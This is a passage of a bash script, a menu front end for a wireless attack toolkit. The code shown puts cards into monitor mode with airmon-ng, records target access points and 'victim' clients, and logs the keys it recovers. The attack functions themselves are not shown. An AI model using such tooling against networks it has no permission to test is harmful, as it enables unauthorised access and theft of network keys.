#!/bin/bash

# Attack Vector Program v1.0
# by ACIDPHYX
					# <--- Start Main Menu Function

function Main-Menu {
cd /root/attackvector
clear
cat ./headers/mainheader
cat ./headers/line1
if [ "$INT" = "$(cat /dev/null)" ]; then
        echo "      No Attack Interface Currently Set!"
else
        echo "	Attack Interface Currently Set to $INT"
fi
echo
 OPTIONS="Interface-Status-Check Interface-Options Target-Options Attacks Decoders Connect WIFI-Scans LAN-Scans WIFI-Monitoring MAC-Options Driver-Options Clean Exit"
	select opt in $OPTIONS; do
		if [ "$opt" = "Exit" ]; then
			> /tmp/AVrestart
			clear
			echo "Quitting..."
			sleep 1
			exit
		elif [ "$opt" = "Restart" ]; then
			echo "TRUE" > /tmp/AVrestart
			echo
			echo "---> Shutting Down..."
				./attack.sh
		elif [ "$opt" = "$opt" ]; then
			export PARENT=$opt
				$opt
		else
			echo "Invalid Selection! Try Again!"
			sleep 1
				Main-Menu
		fi
	done
}

					# End Main Menu Function --->

					# <--- Start Interface Status Check Function

function Interface-Status-Check {
clear
cat ./headers/interfacestatuscheckheader
cat ./headers/line1
	ifconfig -a | grep HWaddr > ./tmp/statuscheckmain
	grep '00-00-00' ./tmp/statuscheckmain | grep -v wifi |cut -b 1-6  > ./tmp/monitoringinterfaces
	grep 'HWaddr' ./tmp/statuscheckmain | grep -v '00-00-00' | grep -v wifi | grep -v eth| cut -b 1-6 > ./tmp/managedinterfaces
	grep 'HWaddr' ./tmp/statuscheckmain | grep '00-00-00' | grep 'wifi' | cut -b 1-6 > ./tmp/parentinterfaces
	if [ "$PARENT" = "Interface-Status-Check" ]; then
			statusdisplay
	elif [ "$PARENT" = "ENABLE" ]; then
			initalizemonitormode
	elif [ "$PARENT" = "DISABLE" ]; then
			disablemonitor
	elif [ "$PARENT" = "MAC" ]; then
			macmenu
	elif [ "$PARENT" = "CREATE" ]; then
			createmanaged
	elif [ "$PARENT" = "DESTROY" ]; then
			destroymanaged
	elif [ "$PARENT" = "CONNECT" ]; then
			intselect
	elif [ "$PARENT" = "KISMET" ]; then
			preparekismet
	else
		echo "Problem"
	fi
}

					# End Interface Status Check Function --->

					# <--- Start Status Display Function

function statusdisplay {
clear
cat ./headers/statusdisplayheader
cat ./headers/line1
	if [ "$(cat ./tmp/monitoringinterfaces | wc -l)" -gt "0" ]; then
		echo "      =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		echo "      =  Found $(cat ./tmp/monitoringinterfaces | wc -l) Currently in Monitor Mode. ="
		echo "      =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		for ints in $(cat ./tmp/monitoringinterfaces); do
			echo "         Interface $ints is in Monitor Mode."
		done
	else
		echo "       No Interfaces Currently in Monitor Mode."
		export INT=""
	fi
echo
	if [ "$(cat ./tmp/managedinterfaces |wc -l)" -gt "0" ]; then
		echo "  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		echo "  =  Found $(cat ./tmp/managedinterfaces | wc -l) Interfaces Currently in Managed Mode.  ="
		echo "  =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		for ints in $(cat ./tmp/managedinterfaces); do
			echo "     Interface $ints is currently in Managed Mode."
		done
	else 
		echo "       No Interfaces Currently in Managed Mode."
	fi
echo
	if [ $(cat ./tmp/parentinterfaces |wc -l) -gt "0" ]; then
		echo "         =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		echo "         =  Found $(cat ./tmp/parentinterfaces | wc -l) Parent Wifi Devices  ="
		echo "         =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
		for ints in $(cat ./tmp/parentinterfaces); do
			echo "              $ints is a Parent Device."
		done
	else
		echo "You have no Compatible Wifi Cards Installed!"
	fi
echo
	echo "      Interface Detection and Display Complete!"
	echo
	if [ "$(cat ./tmp/monitoringinterfaces | wc -l)" = "1" ]; then
		echo "        Setting $(cat ./tmp/monitoringinterfaces)as Attacking Interface..."
		export INT=$(cat ./tmp/monitoringinterfaces)
		echo "              Interface now set as $INT"
		echo
	elif [ "$(cat ./tmp/monitoringinterfaces |wc -l)" -gt "2" ]; then
		echo "Would you like to set a Monitoring Interface as your Attacking Interface?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "n" ]; then
			echo "NULL" > /dev/null
		elif [ "$Q" = "y" ]; then
				setinterface
		else
			echo "Invalid Selection!"
		fi
	else
		echo "NULL" > /dev/null
	fi
	echo "        Press Enter to Return to Main Menu."
	read ENTER
	echo "Returning to Main Menu..."
	sleep 1
			Main-Menu
}

					# End Status Display Function --->

					# <--- Start Set Attack Interface Function

function setinterface {
clear
cat ./headers/setinterfaceheader
cat ./headers/line1
	echo "Which would you like to set as your Attack Interface?"
 OPTIONS="$(cat ./tmp/monitoringinterfaces |cut -d" " -f1) Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
			echo
			echo "Setting $opt as attack interface..."
			export INT=$opt
			echo
			echo "Attack Interface now set as $INT"
			echo
			echo "Press Enter to Return to Main Menu."
			read ENTER
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		else
			echo "Invalid Selection!"
				Main-Menu
		fi
	done
}

					# End Set Attack Interface Function --->

					# <---Start Interface Modes Menu Function

function Interface-Options {
clear
cat ./headers/interfacemodesheader
cat ./headers/line1
	echo "---> How would you like to change your Interfaces?"
 OPTIONS="Enable-Monitor Disable-Monitor Create-Managed Destroy-Managed Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 2
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			$opt
		else
			echo
			echo "Invalid Selection!"
			sleep 1
				Interface-Options
		fi
	done
}

					# End Interface Modes Menu Function--->

					# <--- Start Enable Monitor Return Function
function Enable-Monitor {
	export PARENT=ENABLE
		Interface-Status-Check
}

					# End Enable Monitor Return Function --->

					# <--- Start Enable Monitor Mode Initalization Function

function initalizemonitormode {
clear
cat ./headers/initalizemonitormodeheader
cat ./headers/line1
echo "Which Interface would you like to enable for Monitoring?"
 OPTIONS="$(cat ./tmp/parentinterfaces) Interface-Options Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
					Main-Menu
		elif [ "$opt" = "Interface-Options" ]; then
			echo
			echo "---> Returning to Interface Options..."
			sleep 1
				Interface-Options
		elif [ "$opt" = "$opt" ]; then
			echo
			echo "Initalizing $opt and creating a VAP in Monitor Mode..."
			airmon-ng start $opt > ./tmp/airmonstart
			export INT=$(grep 'enabled' ./tmp/airmonstart | cut -f1)
			export INTCHIP=$(grep 'enabled' ./tmp/airmonstart | cut -b 7-13)
			export INTDRIVER=$(grep 'enabled' ./tmp/airmonstart | cut -b 16-25)
			export INTPARENT=$(grep 'enabled' ./tmp/airmonstart | cut -b 40-44)
			export INTSTATUS=$(grep 'enabled' ./tmp/airmonstart | cut -b 49-67)
			echo
			echo "VAP $INT Create in Monitor Mode"
			echo "Attack Interface Set as $INT"
			echo
			echo "		~Interface Information~"
			echo "	  Interface Name:---$INT"
			echo "	  Mode:-------------M$INTSTATUS"
			echo "	  Chipset:----------$INTCHIP"
			echo "	  Driver:-----------$INTDRIVER"
			echo "	  Parent:-----------$INTPARENT"
			echo
			echo "Done!"
			echo
			echo "Press Enter to Return to Main Menu."
			read ENTER
			echo "---> Returning to Main Menu..."
			sleep 1
					Main-Menu
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Enable Monitor Mode Initalization Function --->

					# <--- Start Diable Monitor Mode Return Function

function Disable-Monitor {
	export PARENT=DISABLE
	Interface-Status-Check
}

					# End Disable Monitor Mode Return Function --->

					# <--- Start Disable Monitoring Interfaces Function

function disablemonitor {
clear
cat ./headers/disablemonitorheader
cat ./headers/line1
	if [ "$(cat ./tmp/monitoringinterfaces | wc -l)" -gt "0" ]; then
		echo
		echo "Which Monitoring Interface would you like to Disable?"
		 OPTIONS="$(cat ./tmp/monitoringinterfaces |cut -d" " -f1) Main-Menu"
			select opt in $OPTIONS; do
				if [ "$opt" = "Main-Menu" ]; then
					echo "Returning to Main Menu..."
					sleep 1
							Main-Menu
				elif [ "$opt" = "$opt" ]; then
					clear
					cat ./headers/disablemonitorheader
					cat ./headers/line1
					echo
					echo "Disabling Monitoring Interface $opt..."
					airmon-ng stop $opt > ./tmp/airmonstop
		                        export INTCHIP=$(grep 'destroyed' ./tmp/airmonstop | cut -b 7-13)
		                        export INTDRIVER=$(grep 'destroyed' ./tmp/airmonstop | cut -b 16-25)
		                        export INTPARENT=$(grep 'destroyed' ./tmp/airmonstop | cut -b 40-44)
		                        export INTSTATUS=$(grep 'destroyed' ./tmp/airmonstop | cut -b 48-60)
		                        echo
		                        echo "VAP $opt Destroyed!"
					if [ "$opt" = "$INT" ]; then
						export INT=""
					else
						echo "NULL" > /dev/null
					fi
                		        echo "Attack Interface is no longer Set!"
		                        echo
		                        echo "          ~Interface Information~"
		                        echo "    Interface Name:---$opt"
		                        echo "    Mode:-------------$INTSTATUS"
		                        echo "    Chipset:----------$INTCHIP"
		                        echo "    Driver:-----------$INTDRIVER"
		                        echo "    Parent:-----------$INTPARENT"
		                        echo
		                        echo "Done!"
		                        echo
					echo "Press Enter to Return to Main Menu."
                        		read ENTER
                        		echo "Returning to Main Menu..."
                        		sleep 1
                                        		Main-Menu
				else
					echo "Invalid Selection!"
							disablemonitor
				fi
			done
	else
		echo
		echo "No Interfaces Currenty in Monitor Mode!"
		echo
		echo "Returning to Interface Options..."
		sleep 2
				Interface-Options
	fi			
}

					# End Disable Monitor Mode Function --->

					# <---Start Create Managed Mode Return Function

function Create-Managed {
	export PARENT=CREATE
		Interface-Status-Check
}

					# End Create Managed Mode Return Function--->

					# <--- Start Create Managed Mode Interface Function

function createmanaged {
clear
cat ./headers/createmanagedheader
cat ./headers/line1
	echo
	if [ "$(cat ./tmp/parentinterfaces)" = "$(cat /dev/null)" ]; then
		echo "---> No Wireless Interfaces Found!"
		echo "---> Please Install one!"
		echo "---> Returning to Main Menu..."
		sleep 2
			Main-Menu
	else
		if [ "$(cat ./tmp/managedinterfaces |grep -v vmnet |wc -l)" -ge "0" ]; then
			echo "---> Found $(cat ./tmp/managedinterfaces |grep -v vmnet |wc -l) Currently in Managed Mode."
			echo
			echo "---> Please Select a Parent Interface."
			cat ./headers/line1
			 OPTIONS="$(cat ./tmp/parentinterfaces) Interface-Options Main-Menu"
				select opt in $OPTIONS; do
				if [ "$opt" = "Interface-Options" ]; then
					echo
					echo "---> Returning to Interface Options..."
					sleep 1
						Interface-Options
				elif [ "$opt" = "Main-Menu" ]; then
					echo
					echo "---> Returning to Main Menu..."
					sleep 1
						Main-Menu
				elif [ "$opt" = "$opt" ]; then
					export PINT=$opt
					echo
					echo "---> What would you like to call the new interface?"
					echo "---> [ie: ath* wlan*]"
					read INTNAME
					echo
					if [ "$INTNAME" = "$(cat /dev/null)" ]; then
						if [ "$(cat ./tmp/parentinterfaces |grep wlmaster0)" = "$(cat /dev/null)" ]; then
							echo "---> Using Default Interface Name: ath*"
							INTNAME=ath
								createmanagedcont
						else
							echo "---> Using Default Interface Name: wlan*"
							INTNAME=wlan
								createmanagedcont
						fi
					elif [ "$INTNAME" = "quit" ]; then
						echo "---> Returning to Main Menu..."
						sleep 1
							Main-Menu
					elif [ "$INTNAME" = "$INTNAME" ]; then
						echo "---> Interface name set: $INTNAME!"
						sleep 1
							createmanagedcont
					else
						echo "Invalid Selection!"
					fi
				else
					echo "Invalid Selection!"
				fi
			done
		fi
	fi
}

					# End Create Managed Mode Interface Function--->

					# <---Start Select Managed Mode Interface Function

function selectmanaged {
	echo
	echo "---> Managed Interfaces <---"
	echo "----------------------------"
	for ints in $(cat ./tmp/managedinterfaces |grep -v vmnet); do
		echo "---> $ints"
	done
	echo "----------------------------"
	echo 
	echo "---> Would you like to set one as the Connection Interface?"
	echo "---> [y/n]"
	read Q
	echo
	if [ "$Q" = "n" ]; then					
		echo "---> Returning to Interface Options Menu..."
		sleep 2
			Main-Menu
	elif [ "$Q" = "y" ]; then
	 OPTIONS="$(cat ./tmp/managedinterfaces |grep -v vmnet) Interface-Options Main-Menu"
		select opt in $OPTIONS; do
			if [ "$opt" = "Interface-Options" ]; then
				echo
				echo "---> Returning to Interface Options Menu..."
				sleep 1
					Interface-Options
			elif [ "$opt" = "Main-Menu" ]; then
				echo
				echo "---> Returning to Main Menu..."
				sleep 1
					Main-Menu
			elif [ "$opt" = "$opt" ]; then
				echo "$opt" > ./tmp/connectinterface
				echo "---> Connection Interface Set as: $(cat ./tmp/connectinterface)"
				echo
				sleep 1
				echo "---> Returning to Main Menu..."
				sleep 1
					Main-Menu
			else
				echo "Invalid Selection!"
			fi
		done
	else
		echo "Invalid Selection!"
	fi
}

					# End Select Managed Mode Interface Function--->

					# <---Start Create Manaded Mode Interface Initalization Function

function createmanagedcont {
	echo "---> Initalizing Creation of New Managed VAP..."
	echo "---> Creating..."
	export CINT=$(wlanconfig $INTNAME create wlandev $PINT wlanmode managed)
	if [ "$CINT" = "$(cat /dev/null)" ]; then
		echo "---> Error! Creating New Managed Interface..."
		echo "---> Returning to Interface Options Menu..."
		sleep 1
			Interface-Options
	else
		echo "---> Created New Interface $CINT!"
	fi
	echo "---> Bringing Interface Up..."
	ifconfig $CINT down
	ifconfig $CINT up
	echo "---> Interface Up!"
	echo "---> Interface Created Successfully!"
	sleep 1
	echo
	echo "---> Returning to Main Menu..."
		Main-Menu
}

					# End Create Managed Mode Interface Initalization Function--->

					# <---Start Destroy Managed Mode Interfaces Return Function

function Destroy-Managed {
	export PARENT=DESTROY
		Interface-Status-Check
}

					# End Destroy Managed Mode Interfaces Return Function--->

					# <---Start Destroy Managed Mode Function

function destroymanaged {
clear
cat ./headers/destroymanagedheader
cat ./headers/line1
if [ "$(cat ./tmp/managedinterfaces |grep -v vmnet)" = "$(cat /dev/null)" ]; then
	echo "---> No Interfaces Currently in Managed Mode!"
	echo "---> Returning to Interface Options..."
	sleep 1
		Interface-Options
else
	echo "NULL" > /dev/null
fi
	echo "---> Please Select Interface to Destroy."
 OPTIONS="$(cat ./tmp/managedinterfaces |grep -v vmnet) Interface-Options Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Interface-Options" ]; then
			echo
			echo "---> Returning to Interface Options..."
			sleep 1
				Interface-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "---> Returning to Main Menu..."
			sleep 1
				Main-Menu
		elif [ "$opt" = "$opt" ]; then
			echo
			echo "---> Checking for Active Connection..."
			if [ -e /tmp/*$opt*.pid ]; then
				echo "---> Active Connection Found!"
				echo "---> Probing Card for Associated AP..."
				AP=$(iwconfig $opt |grep ESSID |cut -d'"' -f2)
				echo "---> Interface $opt is connected to $AP!"
				echo
				echo "---> Would you like to Terminate that connection"
				echo "	and proceed to destroy the interface?"
				echo "---> [y/n]"
				read Q
				if [ "$Q" = "n" ]; then
					echo
					echo "---> No Changes Made!"
					echo "---> Returning to Main Menu..."
					sleep 1
						Main-Menu
				elif [ "$Q" = "y" ]; then
					TINT=$opt
					export PARENT=DESTROY
					echo "---> Initalizing Connection Termination..."
					detecttype
				else
					echo "Invalid Selection!"
				fi
			else
				echo "---> No Active Connection Found!"
				TINT=$opt
					destroymanagedcont
			fi
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Destroy Managed Mode Function--->

					# <---Start Destroy Managed Mode Function Continued

function destroymanagedcont {
	echo "---> Destroying Interface $TINT..."
	ifconfig $TINT down
	wlanconfig $TINT destroy
	echo "---> Destroying Cache..."
	rm /etc/dhcpc/*$TINT* 2> /dev/null
	WORKED=$(ifconfig |grep $TINT)
	if [ "$WORKED" = "$(cat /dev/null)" ]; then
		echo "---> Destruction Successfull!"
		echo
		echo "---> Returning to Main Menu..."
		sleep 1
			Main-Menu
	else
		echo "---> Destruction Failed!"
		echo
		echo "---> Returning to Interface Options..."
		sleep 1
			Interface-Options
	fi
}

					# End Destroy Managed Mode Function Continued--->

					# <--- Start Target Options Menu

function Target-Options {
clear
cat ./headers/targetoptionsheader
cat ./headers/line1
 OPTIONS="Set View Change Save View-Log Set-From-Logs Remove-Log-Entry Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 2
					Main-Menu
		elif [ "$opt" = "$opt" ]; then
					$opt
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Target Options Menu --->

					# <---Start Target Information Prompt Function

function Set {
clear
cat ./headers/specifytargetheader
cat ./headers/line1
	> ./tmp/targetencryptionprotocol
	echo "---> Target BSSID?"
	echo "------------------"
	read BSSID
	if [ "$BSSID" = "return" ]; then
		Main-Menu
	else
		echo "NULL" > /dev/null
	fi
	echo "------------------"
	export TBSSID=$BSSID
	echo
	echo "---> Target ESSID?"
	echo "------------------"
	read ESSID
	echo "------------------"
	export TESSID=$ESSID
	echo
	echo "---> Channel of Target?"
	echo "-----------------------"
	read CH
	echo "-----------------------"
	export TCH=$CH
	echo
	echo "---> Targets Encryption?"
	echo "---> [WEP/WPA]"
	read ENC
	export TENC=$ENC
	if [ "$TENC" = "WPA" ]; then
		echo
		echo "---> Please Select a WPA-PSK Encryption Algorithm."
		echo
		 OPTIONS="$(cat ./config/wpatypes.cfg)"
			select opt in $OPTIONS; do
				if [ "$opt" = "$opt" ]; then
					export TENCP=$opt
					echo 
					echo "---> Target Encryption Protocol Set!"
					echo "---> $TENCP"
					sleep 1
						secondary
				else
					echo "Invalid Selection!"
				fi
			done
	else
		secondary
	fi
}

					# End Set Target Function Main --->

					# <---Start Set Target Function Secondary
function secondary {
		echo
		echo "---> Victim Clients' BSSID?"
		echo "---------------------------"
		read VIC
		echo "---------------------------"
		export VICBSSID=$VIC
		echo
		echo "---> Target APs Encryption Code?"
		echo "--------------------------------"
		read ENCCODE
		echo "--------------------------------"
		export TENCCODE=$ENCCODE
		export CENCCODE=$ENCCODE
		echo
		echo "---> Done!"
		sleep 1
		echo
		echo "		New Target Set!"
		cat ./headers/line1
		echo
		echo "	Targets BSSID:---$TBSSID"
		echo "	Targets ESSID:---$TESSID"
		echo "	Channel:---------$TCH"
		echo "	Encryption:------$TENC"
		if [ "$TENCP" = "$(cat /dev/null)" ]; then
			echo "NULL" > /dev/null
		else
		echo "	Cipher Suite:----$TENCP"
		fi
		if [ "$VICBSSID" = "$(cat /dev/null)" ]; then
			echo "	Victims' BSSID:--Not Set!"
		else
		echo "	Victims' BSSID:--$VICBSSID"
		fi
		if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
			echo "	Key:-------------Not Set!"
		else
			echo "	Key:-------------$TENCCODE"
		fi
		echo
		echo "Is the Information Correct?"
		echo "[y/n]"
		read Q
		if [ "$Q" = "n" ]; then
				Change
		elif [ "$Q" = "y" ]; then
			export PARENT=""
			echo "Done!"
			echo
			echo "Returning to Main Menu..."
			sleep 1
				Main-Menu
		else
			echo "Invalid Selection!"
		fi
}

					# End Set Target Information Prompt Function --->

					# <---Start View Target Information Function

function View {
clear
cat ./headers/viewtargetheader
cat ./headers/line1
	if [ "$TBSSID" = "$(cat /dev/null)" ]; then
		echo "No Target Set!"
		echo
		echo "Returning to Main-Menu..."
		sleep 2
			Main-Menu
	else
		echo "	   Targets BSSID:---$TBSSID"
		echo "	   Targets ESSID:---$TESSID"
		echo "	   Channel:---------$TCH"
		echo "	   Encryption:------$TENC"
		if [ "$TENCP" = "$(cat /dev/null)" ]; then
			if [ "$TENC" = "WEP" ]; then
				echo "	   Cipher Suite:----WEP"
			else
				echo "	   Cipher Suite:----Not Set!"
			fi
		else
			echo "	   Cipher Suite:----$TENCP"
		fi
		if [ "$VICBSSID" = "$(cat /dev/null)" ]; then
			echo "	   Victims' BSSID:--Not Set!"
		else
			echo "	   Victims' BSSID:--$VICBSSID"
		fi
		if [ "$PARENT" = "LOGSET" ]; then
			if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
				echo "	   Key:-------------Not Set!"
			else
				echo "	   Key:-------------$TENCCODE"
			fi
		else
			if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
				echo "	   Key:-------------Not Set!"
			else
				echo "	   Key:-------------$TENCCODE"
			fi
		fi
		echo
		echo "Press Enter to Return to Previous Menu"
		read ENTER
		echo
		echo "Returning to Previous Menu..."
				Target-Options
	fi
}

					# End View Target Information Function

					# <---Start Change Target Information Function

function Change {
clear
cat ./headers/changetargetheader
cat ./headers/line1
	echo "---> Which Target Information would you like to change?"
 OPTIONS="AP-BSSID AP-ESSID Channel Encryption Victim-BSSID ENC-Key Previous-Menu Main-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "AP-BSSID" ]; then
			echo
			echo "---> Please Enter New Target BSSID."
			echo "-----------------------------------"
			read APBSSID
			echo "-----------------------------------"
			export TBSSID=$APBSSID
			echo
			echo "---> Target BSSID now set!"
			echo "---> Target: $TBSSID"
			echo
			echo "---> Would you like to change another Target Value?"
                        echo "---> [y/n]"
			read Q
			if [ "$Q" = "n" ]; then
				echo
				echo "Returning to Main Menu..."
				sleep 1
						Main-Menu
			elif [ "$Q" = "y" ]; then
				Change
			else
				echo
				echo "Invalid Selection!"
			fi
                elif [ "$opt" = "AP-ESSID" ]; then
                        echo
                        echo "---> Please Enter New Target ESSID."
			echo "-----------------------------------"
                        read APESSID
			echo "-----------------------------------"
			export TESSID=$APESSID
                        echo
                        echo "---> Target ESSID now set!"
                        echo "---> Target: $TESSID"
                        echo
                        echo "---> Would you like to change another Target Value?"
                        echo "---> [y/n]"
                        read Q
                        if [ "$Q" = "n" ]; then
                                echo
                                echo "Returning to Main Menu..."
                                sleep 1
                                                Main-Menu
                        elif [ "$Q" = "y" ]; then
                                Change
                        else
                                echo
                                echo "Invalid Selection!"
                        fi
                elif [ "$opt" = "Channel" ]; then
			echo
                        echo "---> Please Enter New Target Channel."
			echo "-------------------------------------"
                        read CH
			echo "-------------------------------------"
			export TCH=$CH
                        echo
                        echo "---> Target Channel now set!"
                        echo "---> Target: $TCH"
                        echo
                        echo "---> Would you like to change another Target Value?"
			echo "---> [y/n]"
                        read Q
                        if [ "$Q" = "n" ]; then
                                echo
                                echo "Returning to Main Menu..."
                                sleep 1
                                                Main-Menu
                        elif [ "$Q" = "y" ]; then
                                Change
                        else
                                echo
                                echo "Invalid Selection!"
                        fi
                elif [ "$opt" = "Encryption" ]; then
                        echo
                        echo "---> Please select new ecryption algoithm."
			echo "----------------------------------------"
                         OPTIONS="$(cat ./config/wpatypes.cfg) WEP OPEN Cancel"
				select opt in $OPTIONS; do
					if [ "$opt" = "Cancel" ]; then
						echo
						echo "Returning to Main Menu..."
						sleep 1
							Main-Menu
					elif [ "$opt" = "WEP" ]; then
						export TENC=WEP
						export TENCP=WEP
						echo
						echo "---> Target Encryption Algorithm Now Set!"
						echo "---> Target Encryption: $TENC"
						echo
						echo "---> Would you like to change another Target Value?"
						read Q
						if [ "$Q" = "y" ]; then
							echo
							echo "---> Returning to Change Menu..."
							sleep 1
								Change
						elif [ "$Q" = "n" ]; then
							echo
							echo "---> Returning to Main Menu..."
							sleep 1
								Main-Menu
						else
							echo
							echo "---> Invalid Selection!"
							echo "---> Returning to Change Menu..."
							sleep 1
								Change
						fi
					elif [ "$opt" = "$opt" ]; then
						export TENCP=$opt
						export TENC=WPA
			                        echo
        			                echo "---> Target Encryption Filter Now Set!"
                	        		echo "---> Target: $TENC"
						echo "---> Cipher: $TENCP"
		                        	echo
	        		                echo "---> Would you like to change another Target Value?"
        	                		echo "---> [y/n]"
                	        		read Q
                        			if [ "$Q" = "n" ]; then
						echo
                        	        	echo "Returning to Main Menu..."
                                		sleep 1
                                                	Main-Menu
	                        		elif [ "$Q" = "y" ]; then
        	                        		Change
                	        		else
                        	        		echo
                                			echo "Invalid Selection!"
                        			fi
					else
						echo
						echo "---> Invalid Selection!"
						echo "---> Try Again!"
						sleep 1
							Change
					fi
				done
                elif [ "$opt" = "Victim-BSSID" ]; then
                        echo
                        echo "---> Please Enter New Victim Client BSSID."
			echo "------------------------------------------"
                        read VIC
			echo "------------------------------------------"
			export VICBSSID=$VIC
                        echo
                        echo "---> Victim Client BSSID now set!"
                        echo "---> Target: $VICBSSID"
                        echo
                        echo "---> Would you like to change another Target Value?"
                        echo "---> [y/n]"
                        read Q
                        if [ "$Q" = "n" ]; then
                                echo
                                echo "Returning to Main Menu..."
                                sleep 1
                                                Main-Menu
                        elif [ "$Q" = "y" ]; then
                                Change
                        else
                                echo
                                echo "Invalid Selection!"
                        fi
		elif [ "$opt" = "ENC-Key" ]; then
                        echo
                        echo "---> Please Enter New Encryption Key."
			echo "------------------------------------------"
                        read ENCCODE
			echo "------------------------------------------"
			export TENCCODE=$ENCCODE
                        echo
                        echo "---> New Encyption Key Set!"
                        echo "---> Target: $TENCCODE"
                        echo
                        echo "---> Would you like to change another Target Value?"
                        echo "---> [y/n]"
                        read Q
                        if [ "$Q" = "n" ]; then
                                echo
                                echo "Returning to Main Menu..."
                                sleep 1
                                                Main-Menu
                        elif [ "$Q" = "y" ]; then
                                Change
                        else
                                echo
                                echo "Invalid Selection!"
                        fi
		elif [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					Target-Options
		elif [ "$opt" = "Main-Menu" ]; then
			echo
			echo "Returning to Main Menu..."
			sleep 1
				Main-Menu
		else
			echo "Invalid Selection!"
		fi
	done
}

					# End Change Target Information Function --->

					# <---Start Save Target in Log Function

function Save {
echo
cat ./headers/line1
echo "---> Which Log would you like to save to?"
 OPTIONS="WEPc WEPnc WPAc WPAnc Previous-Menu"
	select opt in $OPTIONS; do
		if [ "$opt" = "Previous-Menu" ]; then
			echo
			echo "Returning to Previous Menu..."
			sleep 1
					Target-Options
		elif [ "$opt" = "$opt" ]; then
			export LOG=$opt
			echo "---> Accessing Database..."
			sleep 1
			export EXIST=$(cat ./logs/$LOG.log |grep $TESSID)
			if [ "$EXIST" = "$(cat /dev/null)" ]; then
				echo
				echo "---> Saving SSID to List..."
				sleep 1
				if [ "$TENC" = "WEP" ]; then
					SSIDLIST=WEPIDS.log
				elif [ "$TENC" = "WPA" ]; then
					SSIDLIST=WPAIDS.log
				else
					echo "Invalid Encryption Type!"
					sleep 2
					echo "---> Returning to Target Options Menu..."
					sleep 1
						Target-Options
				fi
				echo "$TESSID:$(echo $TBSSID |cut -d":" -f4,5,6)" >> ./logs/$SSIDLIST
				echo "---> Saving Access Point Specifics..."
				sleep 2
				echo "$(cat ./headers/line1)" >> ./logs/$LOG.log
				echo "$TESSID:$(echo $TBSSID |cut -d":" -f4,5,6)" >> ./logs/$LOG.log
				echo "$(cat ./headers/line1)" >> ./logs/$LOG.log
				echo "$(date)" >> ./logs/$LOG.log
				echo "BSSID $TBSSID" >> ./logs/$LOG.log
				echo "ESSID $TESSID" >> ./logs/$LOG.log
				echo "Channel $TCH" >> ./logs/$LOG.log
				echo "Encryption $TENC" >> ./logs/$LOG.log
				if [ "TENCP" = "$(cat /dev/null)" ]; then
					echo "NULL" > /dev/null
				else
					echo "Cipher $TENCP" >> ./logs/$LOG.log
				fi
				if [ "$TENCCODE" = "$(cat /dev/null)" ]; then
					echo "Key" >> ./logs/$LOG.log
				else
					echo "Key $TENCCODE" >> ./logs/$LOG.log
				fi
				echo
				echo "Target Saved in Logs!"
				echo "Saved to (./logs/$LOG.log)"
				echo
				echo "Returning to Previous Menu..."
				sleep 1
					Target-Options
			else
				echo
				echo "---> Access Point Already Exists in Database!"
				sleep 1
				echo
				echo "---> Would you like to Update the Entry?"
				echo "[y/n]"
				read Q
				echo
				if [ "$Q" = "y" ]; then
					if [ "$LOG" = "WEPc" ]; then
						export CODETYPE=WEP
						databaseupdate
					elif [ "$LOG" = "WEPnc" ]; then
						export CODETYPE=WEP
						databaseupdate
					elif [ "$LOG" = "WPAc" ]; then
						export CODETYPE=WPA
						databaseupdate
					elif [ "$LOG" = "WPAnc" ]; then
						export CODETYPE=WPA
						databaseupdate
					fi
				elif [ "$Q" = "n" ]; then
					echo "---> Returning to Target Options..."
					sleep 1
						Target-Options
				else
					echo "---> Invalid Selection!"
				fi
			fi
				
		else
			echo "Invalid Selection!"
		fi
	done
}			

					# End Save Target in Log Function

					# <---Start Database Update Function

function databaseupdate {
	if [ "$CODETYPE" = "WEP" ]; then
		COUNT=$(cat ./logs/$LOG.log |wc -l)
		BEFORE=$(( $COUNT + 1 ))
		AFTER=7
	        TAP=$TESSID:$(echo $TBSSID |cut -d":" -f4,5,6)
	elif [ "$CODETYPE" = "WPA" ]; then
		COUNT=$(cat ./logs/$LOG.log |wc -l)
		BEFORE=$(( $COUNT + 1 ))
		AFTER=8
		TAP=$TESSID:$(echo $TBSSID |cut -d":" -f4,5,6)
	else
		echo
		echo "---> Invalid Encryption Type!"
		echo "---> Returning to Main Menu..."
		sleep 1
			Main-Menu
	fi
	echo "---> Removing Old Entry..."
	sleep 2
 	cat ./logs/$LOG.log |grep $TAP -A $AFTER > ./tmp/olddatabaseentry
	cat ./logs/$LOG.log |grep $TAP -B $BEFORE > ./tmp/olddatabasetop
	cat ./tmp/olddatabasetop |grep -v $TAP > ./tmp/newdatabasetop
	STARTKEY=$(cat ./tmp/olddatabaseentry |grep Key)
	cat ./logs/$LOG.log |grep "$STARTKEY" -A $BEFORE > ./tmp/olddatabasebottom
